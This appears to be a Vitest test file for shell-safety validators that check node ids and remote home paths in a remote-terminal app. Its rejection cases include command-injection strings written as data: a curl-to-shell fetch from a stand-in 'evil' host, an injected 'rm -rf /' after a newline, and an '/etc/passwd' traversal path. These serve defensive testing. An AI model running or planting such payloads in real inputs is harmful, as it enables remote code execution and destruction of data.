import { describe, expect, it } from 'vitest'
import { NODE_ID_MAX, isSafeNodeId, isSafeRemoteHome } from './remote-safety'

describe('isSafeNodeId', () => {
  it('accepts every shape the app actually mints', () => {
    // `nextId()` in state/workspace.ts: `<prefix>-<base36 time>-<counter>`.
    for (const id of ['term-mabc123-7', 'ssh-mabc123-1', 'node-1', 'a', 'A_b.c-1', '9'])
      expect(isSafeNodeId(id)).toBe(true)
  })

  it('refuses anything a remote shell could read as structure', () => {
    for (const id of [
      'a;b',
      'a b',
      'a|b',
      'a$b',
      'a`b`',
      'a\nb',
      'a\\b',
      "a'b",
      'a"b',
      'n1;curl${IFS}http://evil/x|sh;#'
    ])
      expect(isSafeNodeId(id)).toBe(false)
  })

  it('refuses path-shaped and empty ids', () => {
    for (const id of ['', '.', '..', 'a/b', '../../etc/passwd', undefined])
      expect(isSafeNodeId(id)).toBe(false)
  })

  it('refuses an over-long id (a bounded value is a checkable value)', () => {
    expect(isSafeNodeId('a'.repeat(NODE_ID_MAX))).toBe(true)
    expect(isSafeNodeId('a'.repeat(NODE_ID_MAX + 1))).toBe(false)
    expect(isSafeNodeId('a'.repeat(300))).toBe(false)
  })
})

/**
 * FALSE-POSITIVE SWEEP. A validator that refuses something real is an outage, so the accept side is
 * pinned against a broad list of homes and ids that actually occur — spaces, non-ASCII, apostrophes
 * and a literal `$` included. Note `/home/u$x` and `/home/o'brien` are ACCEPTED on purpose: they
 * are legal paths, and the defence against them is quoting at the splice, not this predicate.
 */
const REAL_HOMES = [
  '/root',
  '/home/enes',
  '/home/user.name',
  '/home/user-name',
  '/Users/First Last',
  '/Users/Enes Kırca',
  '/home/ünal',
  '/home/用户',
  '/export/home/u',
  '/var/lib/jenkins',
  '/home/u/',
  '/home/u+group',
  "/home/o'brien",
  '/home/u$x',
  '/data/homes/dept 3/u',
  '/home/u.d/nested',
  '/System/Volumes/Data/Users/e'
]

const REAL_NODE_IDS = [
  'term-mabc-3',
  'ssh-m1a2b3-12',
  'editor-m9-1',
  'group-m4-7',
  'sticky-mz-1',
  'dino-m1-1',
  'browser-m1-2',
  'diff-m1-3',
  'video-m1-4',
  'web-m1-5',
  '550e8400-e29b-41d4-a716-446655440000'
]

describe('no false positives on values that really occur', () => {
  it('accepts every realistic remote home', () => {
    for (const h of REAL_HOMES) expect(isSafeRemoteHome(h), h).toBe(true)
  })
  it('accepts every id shape the app mints', () => {
    for (const id of REAL_NODE_IDS) expect(isSafeNodeId(id), id).toBe(true)
  })
})

describe('isSafeRemoteHome', () => {
  it('accepts real absolute homes, including spaces and non-ASCII', () => {
    for (const h of ['/home/u', '/Users/Enes Kırca', '/var/lib/deploy', '/'])
      expect(isSafeRemoteHome(h)).toBe(true)
  })

  it('refuses a host answer carrying a control character — the newline is a command separator', () => {
    expect(isSafeRemoteHome('/home/u\nrm -rf /')).toBe(false)
    expect(isSafeRemoteHome('/home/u\r')).toBe(false)
    expect(isSafeRemoteHome('/home/u\t')).toBe(false)
    expect(isSafeRemoteHome('/home/u\x7f')).toBe(false)
  })

  it('refuses relative / empty / backslashed / untrimmed / absurd answers', () => {
    for (const h of ['', undefined, 'home/u', 'C:\\Users\\u', ' /home/u', '/home/u ', `/${'a'.repeat(5000)}`])
      expect(isSafeRemoteHome(h)).toBe(false)
  })
})
